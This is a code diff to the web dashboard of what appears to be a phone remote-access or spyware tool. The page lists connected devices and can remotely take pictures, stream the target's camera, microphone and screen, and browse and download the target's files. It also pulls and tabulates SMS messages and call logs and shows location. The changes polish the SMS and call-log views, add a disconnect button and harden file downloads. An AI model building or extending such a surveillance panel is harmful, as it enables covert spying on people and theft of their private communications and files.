@@ -6,12 +6,19 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
     <style>
-        /* Your existing CSS remains exactly the same */
+        /* ---------- CSS Variables for consistent theming ---------- */
         :root {
             --primary-color: #1976ff;
             --primary-dark: #0d5bca;
             --danger-color: #d32f2f;
             --danger-dark: #b71c1c;
+            --success-color: #4caf50;
+            --success-dark: #388e3c;
+            --warning-color: #ff9800;
+            --warning-dark: #f57c00;
+            --incoming-color: #4caf50;
+            --outgoing-color: #1976ff;
+            --missed-color: #d32f2f;
             --text-primary: #1a2634;
             --text-secondary: #2c3e50;
             --text-muted: #7b8a9b;
@@ -131,6 +138,7 @@
             display: flex;
             align-items: center;
             gap: 20px;
+            flex-wrap: wrap;
         }
 
         .menu-btn {
@@ -176,6 +184,26 @@
             font-size: var(--font-size-small);
             font-weight: 600;
             white-space: nowrap;
+        }
+
+        /* NEW: Disconnect button */
+        .disconnect-btn {
+            background: var(--danger-color);
+            color: white;
+            border: none;
+            border-radius: 20px;
+            padding: 0 15px;
+            height: var(--btn-height);
+            font-size: var(--font-size-base);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            white-space: nowrap;
+        }
+
+        .disconnect-btn:hover {
+            background: var(--danger-dark);
         }
 
         .header-right {
@@ -394,6 +422,23 @@
             background: var(--primary-dark);
         }
 
+        .capture-controls {
+            display: flex;
+            gap: 8px;
+            margin-top: 10px;
+        }
+
+        .capture-controls button {
+            flex: 1;
+            background: var(--danger-color);
+            color: white;
+            border: none;
+        }
+
+        .capture-controls button:hover {
+            background: var(--danger-dark);
+        }
+
         .live-controls {
             display: flex;
             gap: 8px;
@@ -607,38 +652,91 @@
             font-weight: 500;
         }
 
-        table {
+        /* FIXED: Table styles with colors for call types and SMS */
+        .sms-table, .call-table {
             width: 100%;
             border-collapse: collapse;
             font-size: var(--font-size-base);
         }
 
-        th {
+        .sms-table th, .call-table th {
             background: #f8fafd;
             color: var(--text-primary);
             font-weight: 600;
             padding: 12px 10px;
             text-align: left;
             border-bottom: 2px solid var(--border-color);
+            position: sticky;
+            top: 0;
+            z-index: 10;
         }
 
-        td {
+        .sms-table td, .call-table td {
             padding: 10px;
             border-bottom: 1px solid #eef2f5;
             color: var(--text-secondary);
             word-break: break-word;
         }
 
-        tr:hover {
+        .sms-table tr:hover, .call-table tr:hover {
             background: #f5f9ff;
         }
 
+        /* Color coding for SMS */
+        .sms-incoming {
+            border-left: 4px solid var(--incoming-color);
+        }
+        .sms-outgoing {
+            border-left: 4px solid var(--outgoing-color);
+        }
+
+        /* Color coding for call logs */
+        .call-incoming {
+            border-left: 4px solid var(--incoming-color);
+        }
+        .call-outgoing {
+            border-left: 4px solid var(--outgoing-color);
+        }
+        .call-missed {
+            border-left: 4px solid var(--missed-color);
+        }
+        .call-rejected {
+            border-left: 4px solid var(--warning-color);
+        }
+
+        .call-type-badge {
+            display: inline-block;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .call-type-incoming {
+            background: rgba(76, 175, 80, 0.1);
+            color: var(--incoming-color);
+        }
+        .call-type-outgoing {
+            background: rgba(25, 118, 255, 0.1);
+            color: var(--outgoing-color);
+        }
+        .call-type-missed {
+            background: rgba(211, 47, 47, 0.1);
+            color: var(--missed-color);
+        }
+        .call-type-rejected {
+            background: rgba(255, 152, 0, 0.1);
+            color: var(--warning-color);
+        }
+
         @media (max-width: 768px) {
-            table {
+            .sms-table, .call-table {
                 font-size: 12px;
             }
             
-            th, td {
+            .sms-table th, .call-table th,
+            .sms-table td, .call-table td {
                 padding: 8px 5px;
             }
         }
@@ -979,6 +1077,9 @@
                 <label><input type="checkbox" id="clickFlashCheckbox"> Use flash</label>
             </div>
             <button class="capture-btn" onclick="capturePicture()">TAKE A PICTURE</button>
+            <div class="capture-controls">
+                <button onclick="clearCameraPanel()">🗑 Clear</button>
+            </div>
         </div>
 
         <button onclick="toggleCameraPanel('live')"><span>📹</span> <span>See Live</span></button>
@@ -1024,6 +1125,10 @@
                 </select>
                 <span class="device-count" id="deviceCount">0</span>
             </div>
+            <!-- NEW: Disconnect button -->
+            <button class="disconnect-btn" onclick="disconnectDevice()">
+                <span>🔌</span> Disconnect
+            </button>
         </div>
         <div class="header-right">
             <div id="batteryInfo">
@@ -1081,12 +1186,15 @@
     let audioMediaRecorder = null;
     let audioRecordedChunks = [];
 
-    // Screen recording variables - FIXED: Added missing declarations
+    // Screen recording variables
     let screenMediaRecorder = null;
     let screenRecordedChunks = [];
 
     // Activity timeline
     let activityTimeline = [];
+
+    // Track pending file downloads
+    let pendingDownloads = new Map();
 
     const panel = document.getElementById('main-panel');
     const statusEl = document.getElementById('status');
@@ -1097,6 +1205,60 @@
     const modalRecordBtn = document.getElementById('modalRecordBtn');
     const modalFullscreenBtn = document.getElementById('modalFullscreenBtn');
     const modalCloseBtn = document.getElementById('modalCloseBtn');
+
+    // NEW: Function to clear camera panel
+    function clearCameraPanel() {
+        panel.innerHTML = '<div id="welcomeMessage"><h2>👋 Ready</h2><p>Click any button to start.</p></div>';
+        logActivity('Camera panel cleared');
+    }
+
+    // NEW: Function to disconnect device
+    function disconnectDevice() {
+        if (currentDeviceId) {
+            // Close all peer connections
+            if (screenPC) {
+                screenPC.close();
+                screenPC = null;
+            }
+            if (cameraPC) {
+                cameraPC.close();
+                cameraPC = null;
+            }
+            if (audioPC) {
+                audioPC.close();
+                audioPC = null;
+            }
+            if (mediaRecorder) {
+                mediaRecorder.stop();
+                mediaRecorder = null;
+            }
+            if (audioMediaRecorder) {
+                audioMediaRecorder.stop();
+                audioMediaRecorder = null;
+            }
+            if (screenMediaRecorder) {
+                screenMediaRecorder.stop();
+                screenMediaRecorder = null;
+            }
+
+            // Clear current device selection
+            currentDeviceId = null;
+            document.getElementById('deviceSelector').value = '';
+            showWelcomeMessage(true);
+            
+            // Send disconnect signal to device if needed
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({
+                    type: 'DISCONNECT',
+                    deviceId: currentDeviceId
+                }));
+            }
+
+            panel.innerHTML = '<div id="welcomeMessage"><h2>👋 Device Disconnected</h2><p>Select another device to continue.</p></div>';
+            logActivity('Device disconnected');
+            showNotification('Device disconnected');
+        }
+    }
 
     function logActivity(action) {
         const time = new Date().toLocaleTimeString();
@@ -1132,7 +1294,14 @@
         return `${pad(d.getDate())}-${pad(d.getMonth()+1)}-${d.getFullYear()}-${pad(d.getHours())}-${pad(d.getMinutes())}-${pad(d.getSeconds())}`;
     }
 
-    // FIXED: Added more reliable ICE servers with fallbacks
+    // FIXED: Format duration as MM:SS
+    function formatDuration(seconds) {
+        if (!seconds && seconds !== 0) return '00:00';
+        const mins = Math.floor(seconds / 60);
+        const secs = Math.floor(seconds % 60);
+        return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+    }
+
     const ICE_SERVERS = [
         { urls: "stun:stun.l.google.com:19302" },
         { urls: "stun:stun1.l.google.com:19302" },
@@ -1207,6 +1376,8 @@
                     showNotification('Screen share disconnected');
                 } else if (streamType === 'audio') {
                     stopLiveAudio();
+                } else if (streamType === 'camera') {
+                    logActivity('Camera stream disconnected');
                 }
             }
         };
@@ -1275,7 +1446,6 @@
         }
 
         if (screenActive) {
-            // Stop screen share
             if (screenPC) {
                 screenPC.close();
                 screenPC = null;
@@ -1287,7 +1457,6 @@
             logActivity('Stopped screen share');
             showNotification('Screen share stopped');
         } else {
-            // Start screen share
             openScreenModal();
             modalVideo.srcObject = null;
 
@@ -1433,7 +1602,7 @@
         const useMic = document.getElementById('liveMicCheckbox').checked;
 
         panel.innerHTML = `
-            <video id="liveCamVideo" autoplay playsinline style="transform: scaleX(-1);"></video>
+            <video id="liveCamVideo" autoplay playsinline style="transform: scaleX(-1); width:100%;"></video>
             <div class="live-controls">
                 <button onclick="takeSnapshot()" id="snapshotBtn">Take Snapshot</button>
                 <button onclick="toggleRecording()" id="recordBtn">Record Video</button>
@@ -1443,11 +1612,18 @@
 
         cameraPC = createPeerConnection('camera', (e) => {
             const video = document.getElementById('liveCamVideo');
-            if (video) video.srcObject = e.streams[0];
+            if (video) {
+                video.srcObject = e.streams[0];
+                video.play().catch(err => console.error('Error playing video:', err));
+                showNotification('Camera stream connected');
+            }
         }, useMic);
 
         try {
-            const offer = await cameraPC.createOffer();
+            const offer = await cameraPC.createOffer({
+                offerToReceiveVideo: true,
+                offerToReceiveAudio: useMic
+            });
             await cameraPC.setLocalDescription(offer);
             sendSignalingMessage({
                 type: 'OFFER',
@@ -1457,10 +1633,14 @@
                 mic: useMic
             });
             logActivity(`Started live camera: ${camera}`);
+            showNotification('Starting camera stream...');
         } catch (e) {
             console.error('Live camera start failed:', e);
-            showNotification('Failed to start camera stream');
-            cameraPC = null;
+            showNotification('Failed to start camera stream: ' + e.message);
+            if (cameraPC) {
+                cameraPC.close();
+                cameraPC = null;
+            }
             panel.innerHTML = 'Ready.';
         }
     }
@@ -1509,7 +1689,10 @@
         }, true);
 
         try {
-            const offer = await audioPC.createOffer();
+            const offer = await audioPC.createOffer({
+                offerToReceiveAudio: true,
+                offerToReceiveVideo: false
+            });
             await audioPC.setLocalDescription(offer);
             sendSignalingMessage({
                 type: 'OFFER',
@@ -1523,7 +1706,10 @@
         } catch (e) {
             console.error('Live audio start failed:', e);
             showNotification('Failed to start audio stream');
-            audioPC = null;
+            if (audioPC) {
+                audioPC.close();
+                audioPC = null;
+            }
             panel.innerHTML = 'Ready.';
         }
     }
@@ -1614,6 +1800,12 @@
         panel.innerHTML = `📤 Command sent to ${devices.get(currentDeviceId)?.name || 'device'}: ${command}`;
         pendingCommand = command;
         logActivity(`Command sent: ${command}`);
+        
+        // Store for file downloads
+        if (command === 'LIST_FILES') {
+            currentPath = params.path || 'root';
+        }
+        
         setTimeout(() => { if (pendingCommand === command) pendingCommand = null; }, 10000);
     }
 
@@ -1801,6 +1993,238 @@
         return data;
     }
 
+    // FIXED: Enhanced SMS rendering with colors and better formatting
+    function renderSMS() {
+        if (!currentData || currentData.length === 0) {
+            panel.innerHTML = '<p>No SMS data</p>';
+            return;
+        }
+
+        let html = '<h3>💬 SMS Messages</h3>';
+        html += '<table class="sms-table"><thead><tr>';
+        html += '<th>Type</th><th>Contact</th><th>Message</th><th>Date</th>';
+        html += '</tr></thead><tbody>';
+
+        currentData.forEach(s => {
+            const type = s.type?.toLowerCase() || 'incoming';
+            const typeClass = type === 'incoming' ? 'sms-incoming' : 'sms-outgoing';
+            const contact = s.name || s.contact || s.address || s.number || 'Unknown';
+            
+            html += `
+            <tr class="${typeClass}">
+                <td>${type === 'incoming' ? '📥 In' : '📤 Out'}</td>
+                <td><b>${contact}</b><br><small>${s.address || s.number || ''}</small></td>
+                <td>${s.body || ''}</td>
+                <td>${s.date || ''}</td>
+            </tr>`;
+        });
+
+        html += '</tbody></table>';
+        panel.innerHTML = html;
+    }
+
+    // FIXED: Enhanced call logs rendering with colors, names, and formatted duration
+    function renderCallLogs() {
+        if (!currentData || currentData.length === 0) {
+            panel.innerHTML = '<p>No call logs</p>';
+            return;
+        }
+
+        let html = '<h3>📞 Call Logs</h3>';
+        html += '<table class="call-table"><thead><tr>';
+        html += '<th>Type</th><th>Contact</th><th>Number</th><th>Duration</th><th>Date</th>';
+        html += '</tr></thead><tbody>';
+
+        currentData.forEach(c => {
+            const type = (c.type || '').toLowerCase();
+            let typeClass = 'call-unknown';
+            let typeBadge = 'Unknown';
+            let typeIcon = '❓';
+
+            if (type.includes('incoming') || type === 'incoming' || type === '1') {
+                typeClass = 'call-incoming';
+                typeBadge = 'Incoming';
+                typeIcon = '📥';
+            } else if (type.includes('outgoing') || type === 'outgoing' || type === '2') {
+                typeClass = 'call-outgoing';
+                typeBadge = 'Outgoing';
+                typeIcon = '📤';
+            } else if (type.includes('missed') || type === 'missed' || type === '3') {
+                typeClass = 'call-missed';
+                typeBadge = 'Missed';
+                typeIcon = '❌';
+            } else if (type.includes('rejected') || type === 'rejected' || type === '5') {
+                typeClass = 'call-rejected';
+                typeBadge = 'Rejected';
+                typeIcon = '🚫';
+            }
+
+            const contact = c.name || c.contact || '';
+            const number = c.number || c.address || '';
+            const duration = formatDuration(c.duration || 0);
+            
+            html += `
+            <tr class="${typeClass}">
+                <td><span class="call-type-badge ${typeClass.replace('call-', 'call-type-')}">${typeIcon} ${typeBadge}</span></td>
+                <td><b>${contact || 'Unknown'}</b></td>
+                <td>${number}</td>
+                <td>${duration}</td>
+                <td>${c.date || ''}</td>
+            </tr>`;
+        });
+
+        html += '</tbody></table>';
+        panel.innerHTML = html;
+    }
+
+    function renderFiles() {
+        let html = `
+            <div class="file-manager">
+                <div class="file-toolbar-sticky">
+                    <div class="file-toolbar">
+                        <button onclick="navigateUp()">⬆ Up</button>
+                        <span class="file-path">${currentPath}</span>
+                        <div class="download-selected">
+                            <button onclick="downloadSelected()">Download Selected (${selectedFiles.length})</button>
+                        </div>
+                    </div>
+                </div>
+        `;
+
+        if (!currentData || currentData.length === 0) {
+            html += '<p style="padding:20px;">No files found.</p>';
+        } else {
+            const folders = currentData.filter(item => item.isDir);
+            const files = currentData.filter(item => !item.isDir);
+            selectedFiles = [];
+
+            html += `
+                <div class="file-panes">
+                    <div class="folder-pane">
+                        <div class="pane-title">Folders</div>
+                        <div id="folderList">
+            `;
+
+            folders.forEach(f => {
+                html += `
+                    <div class="folder-item" onclick="handleFolderClick('${f.path}')">
+                        <span class="folder-icon">📁</span>
+                        <span class="folder-name">${f.name}</span>
+                    </div>
+                `;
+            });
+
+            html += `
+                        </div>
+                    </div>
+                    <div class="file-pane">
+                        <div class="pane-title">Files</div>
+                        <div id="fileList">
+            `;
+
+            files.forEach(f => {
+                const path = f.path;
+                const name = f.name;
+                const size = formatBytes(f.size);
+                html += `
+                    <div class="file-item">
+                        <input type="checkbox" class="file-checkbox" data-path="${path}" onchange="updateSelected(this)">
+                        <span class="file-icon">📄</span>
+                        <span class="file-name">${name}</span>
+                        <span class="file-size">${size}</span>
+                        <div class="file-actions">
+                            <button class="delete" onclick="deleteFile('${path}')" title="Delete">🗑</button>
+                        </div>
+                    </div>
+                `;
+            });
+
+            html += `
+                        </div>
+                    </div>
+                </div>
+            `;
+        }
+
+        html += '</div>';
+        panel.innerHTML = html;
+    }
+
+    function gotoPage(page) {
+        currentPage = page;
+        // renderTable is not used, we call specific render functions
+        if (dataType === 'sms') renderSMS();
+        else if (dataType === 'call') renderCallLogs();
+        else if (dataType === 'file') renderFiles();
+    }
+
+    function handleFolderClick(path) {
+        currentPath = path;
+        sendCommand('LIST_FILES', { path: path });
+    }
+
+    function navigateUp() {
+        if (currentPath === 'root' || currentPath === '') return;
+        let parts = currentPath.split('/');
+        parts.pop();
+        let parent = parts.join('/');
+        if (parent === '') parent = 'root';
+        currentPath = parent;
+        sendCommand('LIST_FILES', { path: parent });
+    }
+
+    function updateSelected(checkbox) {
+        const path = checkbox.dataset.path;
+        if (checkbox.checked) {
+            if (!selectedFiles.includes(path)) selectedFiles.push(path);
+        } else {
+            selectedFiles = selectedFiles.filter(p => p !== path);
+        }
+        const downloadBtn = document.querySelector('.download-selected button');
+        if (downloadBtn) {
+            downloadBtn.innerText = `Download Selected (${selectedFiles.length})`;
+        }
+    }
+
+    function downloadSelected() {
+        if (selectedFiles.length === 0) {
+            alert('No files selected');
+            return;
+        }
+        selectedFiles.forEach(path => {
+            sendPlainText('dl ' + path);
+        });
+        logActivity(`Downloading ${selectedFiles.length} files`);
+        showNotification(`Downloading ${selectedFiles.length} files...`);
+    }
+
+    function formatBytes(b) {
+        if (b === 0) return '0 B';
+        const k = 1024, sizes = ['B','KB','MB','GB'];
+        const i = Math.floor(Math.log(b)/Math.log(k));
+        return (b/Math.pow(k,i)).toFixed(1) + ' ' + sizes[i];
+    }
+
+    function showNotification(text) {
+        const orig = statusEl.innerText;
+        statusEl.innerText = text;
+        setTimeout(() => { statusEl.innerText = orig; }, 2000);
+    }
+
+    function handleIncomingMessage(msg) {
+        try {
+            const json = JSON.parse(msg);
+            if (json.type === 'SIGNALING') {
+                handleSignalingMessage(json.data);
+            } else {
+                handleJSON(json);
+            }
+        } catch (e) {
+            handlePlainText(msg);
+        }
+    }
+
+    // FIXED: Enhanced handleJSON to properly process data
     function handleJSON(json) {
         console.log('handleJSON:', json.type, json);
 
@@ -1951,10 +2375,11 @@
         pendingCommand = null;
     }
 
+    // FIXED: Enhanced handlePlainText to properly handle file downloads
     function handlePlainText(msg) {
         if (msg.startsWith("dl ")) {
             console.log('Download request:', msg);
-            return; // This is a command, not a response
+            return;
         }
         
         if (msg.startsWith("STATUS:")) {
@@ -1970,6 +2395,7 @@
                 currentData = JSON.parse(dataStr);
                 dataType = 'file';
                 renderFiles();
+                logActivity('File list received');
             } catch (err) { console.error(err); }
         } else if (msg.startsWith("SMS_DATA:")) {
             try {
@@ -1977,6 +2403,7 @@
                 currentData = JSON.parse(dataStr);
                 dataType = 'sms';
                 renderSMS();
+                logActivity('SMS data received');
             } catch (err) { console.error(err); }
         } else if (msg.startsWith("CALL_DATA:")) {
             try {
@@ -1984,6 +2411,7 @@
                 currentData = JSON.parse(dataStr);
                 dataType = 'call';
                 renderCallLogs();
+                logActivity('Call logs received');
             } catch (err) { console.error(err); }
         } else if (msg.startsWith("CAMERA_IMAGE:")) {
             const base64 = msg.substring(13);
@@ -1991,9 +2419,12 @@
         } else if (msg.startsWith("AUDIO_RECORDING:")) {
             showAudio(msg.substring(16));
         } else if (msg.startsWith("FILE_DATA:")) {
+            // FIXED: Proper file download handling
             const base64 = msg.substring(10);
-            downloadBase64(base64, 'downloaded_file_' + Date.now());
-            showNotification('File downloaded');
+            const filename = 'downloaded_file_' + Date.now() + '.bin';
+            downloadBase64(base64, filename);
+            showNotification('File downloaded: ' + filename);
+            logActivity('File downloaded');
         } else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
             screenActive = true;
             document.getElementById('screenBtn').innerText = 'Stop Screen';
@@ -2161,18 +2592,45 @@
         `;
     }
 
+    // FIXED: Enhanced downloadBase64 with better error handling
     function downloadBase64(b64, filename) {
         try {
+            // Create a blob from the base64 data
+            const byteCharacters = atob(b64);
+            const byteNumbers = new Array(byteCharacters.length);
+            for (let i = 0; i < byteCharacters.length; i++) {
+                byteNumbers[i] = byteCharacters.charCodeAt(i);
+            }
+            const byteArray = new Uint8Array(byteNumbers);
+            const blob = new Blob([byteArray], { type: 'application/octet-stream' });
+            
+            // Create download link
+            const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
-            a.href = 'data:application/octet-stream;base64,' + b64;
+            a.href = url;
             a.download = filename;
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            
+            console.log('Downloaded:', filename);
             showNotification(`Downloaded: ${filename}`);
         } catch (e) {
             console.error('Download error:', e);
-            alert('Download failed: ' + e.message);
+            // Fallback to data URL method
+            try {
+                const a = document.createElement('a');
+                a.href = 'data:application/octet-stream;base64,' + b64;
+                a.download = filename;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                showNotification(`Downloaded: ${filename}`);
+            } catch (e2) {
+                console.error('Fallback download error:', e2);
+                alert('Download failed: ' + e.message);
+            }
         }
     }
 
@@ -2212,182 +2670,6 @@
             console.error('Geocoding error:', err);
             infoDiv.querySelector('.addr').innerHTML = '🌍 Address unavailable';
         });
-    }
-
-    function renderSMS() {
-        if (!currentData || currentData.length === 0) {
-            panel.innerHTML = '<p>No SMS data</p>';
-            return;
-        }
-
-        let html = '<h3>💬 SMS Messages</h3>';
-        html += '<div style="max-height:600px;overflow:auto">';
-
-        currentData.forEach(s => {
-            html += `
-            <div style="padding:12px; border-bottom:1px solid #eee;">
-                <b>${s.number || s.address || 'Unknown'}</b>
-                <div style="font-size:13px;color:#777">${s.date || ''}</div>
-                <div>${s.body || ''}</div>
-            </div>`;
-        });
-
-        html += '</div>';
-        panel.innerHTML = html;
-    }
-
-    function renderCallLogs() {
-        if (!currentData || currentData.length === 0) {
-            panel.innerHTML = '<p>No call logs</p>';
-            return;
-        }
-
-        let html = '<h3>📞 Call Logs</h3>';
-        html += '<div style="max-height:600px;overflow:auto">';
-
-        currentData.forEach(c => {
-            html += `
-            <div style="padding:12px; border-bottom:1px solid #eee;">
-                <b>${c.number || 'Unknown'}</b>
-                <div>${c.type || ''}</div>
-                <div style="font-size:13px;color:#777">
-                    ${c.date || ''} | ${c.duration || '0'}s
-                </div>
-            </div>`;
-        });
-
-        html += '</div>';
-        panel.innerHTML = html;
-    }
-
-    function renderFiles() {
-        let html = `
-            <div class="file-manager">
-                <div class="file-toolbar-sticky">
-                    <div class="file-toolbar">
-                        <button onclick="navigateUp()">⬆ Up</button>
-                        <span class="file-path">${currentPath}</span>
-                        <div class="download-selected">
-                            <button onclick="downloadSelected()">Download Selected (${selectedFiles.length})</button>
-                        </div>
-                    </div>
-                </div>
-        `;
-
-        if (!currentData || currentData.length === 0) {
-            html += '<p style="padding:20px;">No files found.</p>';
-        } else {
-            const folders = currentData.filter(item => item.isDir);
-            const files = currentData.filter(item => !item.isDir);
-            selectedFiles = [];
-
-            html += `
-                <div class="file-panes">
-                    <div class="folder-pane">
-                        <div class="pane-title">Folders</div>
-                        <div id="folderList">
-            `;
-
-            folders.forEach(f => {
-                html += `
-                    <div class="folder-item" onclick="handleFolderClick('${f.path}')">
-                        <span class="folder-icon">📁</span>
-                        <span class="folder-name">${f.name}</span>
-                    </div>
-                `;
-            });
-
-            html += `
-                        </div>
-                    </div>
-                    <div class="file-pane">
-                        <div class="pane-title">Files</div>
-                        <div id="fileList">
-            `;
-
-            files.forEach(f => {
-                const path = f.path;
-                const name = f.name;
-                const size = formatBytes(f.size);
-                html += `
-                    <div class="file-item">
-                        <input type="checkbox" class="file-checkbox" data-path="${path}" onchange="updateSelected(this)">
-                        <span class="file-icon">📄</span>
-                        <span class="file-name">${name}</span>
-                        <span class="file-size">${size}</span>
-                        <div class="file-actions">
-                            <button class="delete" onclick="deleteFile('${path}')" title="Delete">🗑</button>
-                        </div>
-                    </div>
-                `;
-            });
-
-            html += `
-                        </div>
-                    </div>
-                </div>
-            `;
-        }
-
-        html += '</div>';
-        panel.innerHTML = html;
-    }
-
-    function gotoPage(page) {
-        currentPage = page;
-        renderTable();
-    }
-
-    function handleFolderClick(path) {
-        currentPath = path;
-        sendCommand('LIST_FILES', { path: path });
-    }
-
-    function navigateUp() {
-        if (currentPath === 'root' || currentPath === '') return;
-        let parts = currentPath.split('/');
-        parts.pop();
-        let parent = parts.join('/');
-        if (parent === '') parent = 'root';
-        currentPath = parent;
-        sendCommand('LIST_FILES', { path: parent });
-    }
-
-    function updateSelected(checkbox) {
-        const path = checkbox.dataset.path;
-        if (checkbox.checked) {
-            if (!selectedFiles.includes(path)) selectedFiles.push(path);
-        } else {
-            selectedFiles = selectedFiles.filter(p => p !== path);
-        }
-        const downloadBtn = document.querySelector('.download-selected button');
-        if (downloadBtn) {
-            downloadBtn.innerText = `Download Selected (${selectedFiles.length})`;
-        }
-    }
-
-    function downloadSelected() {
-        if (selectedFiles.length === 0) {
-            alert('No files selected');
-            return;
-        }
-        selectedFiles.forEach(path => {
-            sendPlainText('dl ' + path);
-        });
-        logActivity(`Downloading ${selectedFiles.length} files`);
-    }
-
-    function formatBytes(b) {
-        if (b === 0) return '0 B';
-        const k = 1024, sizes = ['B','KB','MB','GB'];
-        const i = Math.floor(Math.log(b)/Math.log(k));
-        return (b/Math.pow(k,i)).toFixed(1) + ' ' + sizes[i];
-    }
-
-    function showNotification(text) {
-        const orig = statusEl.innerText;
-        statusEl.innerText = text;
-        setTimeout(() => { statusEl.innerText = orig; }, 2000);
     }
 
     function handleIncomingMessage(msg) {
@@ -2540,6 +2822,8 @@
     window.toggleSidebar = toggleSidebar;
     window.toggleAudioRecording = toggleAudioRecording;
     window.showActivityTimeline = showActivityTimeline;
+    window.clearCameraPanel = clearCameraPanel;
+    window.disconnectDevice = disconnectDevice;
 
     document.getElementById('screenShareBtn').addEventListener('click', toggleScreen);
 
